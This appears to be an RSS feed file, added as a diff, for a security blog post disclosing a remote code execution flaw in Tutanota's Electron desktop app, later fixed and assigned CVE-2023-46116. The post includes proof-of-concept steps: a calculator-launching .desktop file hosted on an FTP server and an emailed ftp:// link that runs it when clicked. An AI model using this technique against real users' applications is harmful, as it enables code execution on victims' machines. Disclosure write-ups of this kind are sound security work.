@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Pachinko&#39;s Blog</title>
+    <link>https://pachinko2821.github.io/posts/</link>
+    <description>Recent content in Posts on Pachinko&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>Prajyot Chemburkar</copyright>
+    <lastBuildDate>Sun, 22 Oct 2023 21:28:41 +0530</lastBuildDate><atom:link href="https://pachinko2821.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>The Plight of Unsanitized Function Calls</title>
+      <link>https://pachinko2821.github.io/posts/plight-of-unsanitized-function-calls/</link>
+      <pubDate>Sun, 22 Oct 2023 21:28:41 +0530</pubDate>
+      
+      <guid>https://pachinko2821.github.io/posts/plight-of-unsanitized-function-calls/</guid>
+      <description>Introduction Tutanota is the world&amp;rsquo;s most secure email service, easy to use and private by design. You get fully encrypted calendars and contacts with all our personal and business email accounts. ~The Tutanota Website
+Debugging Setup Tutanota fortunately is open source. So all you have to do is download the application source, spin up vscode or any IDE of your liking and read away. Or you can use grep.app to look at its code, which is what I did in this case.</description>
+      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;Tutanota is the world&amp;rsquo;s most secure email service, easy to use and private by design. You get fully encrypted calendars and contacts with all our personal and business email accounts.&lt;/em&gt; ~&lt;a href=&#34;https://tutanota.com/&#34;&gt;The Tutanota Website&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;debugging-setup&#34;&gt;Debugging Setup&lt;/h1&gt;
+&lt;p&gt;Tutanota fortunately is open source. So all you have to do is download the application source, spin up vscode or any IDE of your liking and read away. Or you can use &lt;a href=&#34;https://grep.app&#34;&gt;grep.app&lt;/a&gt; to look at its code, which is what I did in this case.&lt;/p&gt;
+&lt;p&gt;I particularly like using Ubuntu with the XFCE desktop environment, as it makes it simpler to demonstrate exploits, as we will see later.&lt;/p&gt;
+&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
+&lt;p&gt;My methodology for reviewing electron applications, at least when it comes to &lt;em&gt;electron specific&lt;/em&gt; vulnerabilities, is quite simple: Use a bottom up approach. Grep for sinks and then trace the source.&lt;/p&gt;
+&lt;h1 id=&#34;stumbling-upon-a-sink&#34;&gt;Stumbling Upon a Sink&lt;/h1&gt;
+&lt;p&gt;One of the common functions that developers use in electron apps is &lt;code&gt;openExternal&lt;/code&gt; from the &lt;code&gt;shell&lt;/code&gt; module. This function opens URLs&amp;rsquo; using their default or native applications. As an example, if you pass a URL with the &lt;code&gt;https:&lt;/code&gt; scheme, &lt;code&gt;shell.openExternal&lt;/code&gt; will spawn your default browser to open it.&lt;/p&gt;
+&lt;p&gt;The problem with this is, if developers do not sanitize this function call, and pass it user-controlled URLs&amp;rsquo;, then an attacker may make use of schemes like &lt;code&gt;file:&lt;/code&gt;, &lt;code&gt;ftp:&lt;/code&gt;, &lt;code&gt;smb:&lt;/code&gt;, etc. to gain code execution on a victim&amp;rsquo;s computer. There&amp;rsquo;s a ton of URL schemes availble that can be used to abuse this &amp;ldquo;feature&amp;rdquo;, more on that &lt;a href=&#34;https://positive.security/blog/url-open-rce&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I found this unsanitized call to &lt;code&gt;shell.openExternal&lt;/code&gt; in Tutanota&amp;rsquo;s source:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onNewWindow&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;details&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HandlerDetails&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deny&amp;#34;&lt;/span&gt; } {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parsedUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parseUrlOrNull&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;details&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;parsedUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;warn&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;TAG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not parse url for new-window, will not open&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;parsedUrl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;protocol&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file:&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// this also works for raw file paths without protocol
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;warn&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;TAG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;prevented file url from being opened by shell&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// we never open any new windows directly from the renderer
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// except for links in mails etc. so open them in the browser
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;electron&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;shell&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;openExternal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;parsedUrl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;()).&lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;) =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;warn&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to open external url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;details&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;electron&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dialog&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;showMessageBox&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;showURL_alt&amp;#34;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;buttons&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; [&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ok_action&amp;#34;&lt;/span&gt;)],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;defaultId&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;couldNotOpenLink_msg&amp;#34;&lt;/span&gt;, { &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{link}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;details&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; }),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            })
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        })
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deny&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looks like the devs are sort of aware of what &lt;code&gt;shell.openExternal&lt;/code&gt; can do, hence the blocked &lt;code&gt;file:&lt;/code&gt; scheme. But there are way too many other schemes that we can use to abuse this.&lt;/p&gt;
+&lt;h1 id=&#34;using-ftp-to-gain-rce&#34;&gt;Using FTP to gain RCE&lt;/h1&gt;
+&lt;p&gt;Execute and authenticate to the Tutanota desktop version &lt;code&gt;3.118.8&lt;/code&gt; AppImage on a Ubuntu Desktop with the XFCE environment.
+&lt;img src=&#34;images/tuta-install.png&#34; alt=&#34;tuta-install&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On another machine, host an FTP server with anonymous access enabled. Create and place a &lt;code&gt;pwn.desktop&lt;/code&gt; file in the FTP root, with the following content:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Desktop Entry&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xcalc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Application
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Send an email to the email account logged in on tutanota containing a hyperlink pointing to the &lt;code&gt;pwn.desktop&lt;/code&gt; file on the FTP server. Replace the corresponding values in the hyperlink: &lt;code&gt;ftp://username:password@ip-address/pwn.desktop&lt;/code&gt;.
+&lt;img src=&#34;images/tuta-send-mail.png&#34; alt=&#34;tuta-send-mail&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On the tutanota desktop application, click on the hyperlink in the email received. Observe that the calculator application opens. You may need to confirm execution of the application in some cases.
+&lt;img src=&#34;images/tuta-rce.png&#34; alt=&#34;tuta-rce&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;timeline&#34;&gt;Timeline&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;September 26th 2023, 7:20 AM UTC, Reported to Tutanota&lt;/li&gt;
+&lt;li&gt;September 26th 2023, 9:33 AM UTC, Fixed by Tutanota&lt;/li&gt;
+&lt;li&gt;October 20th 2023, CVE-2023-46116 assigned&lt;/li&gt;
+&lt;li&gt;NA, Report disclosed&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
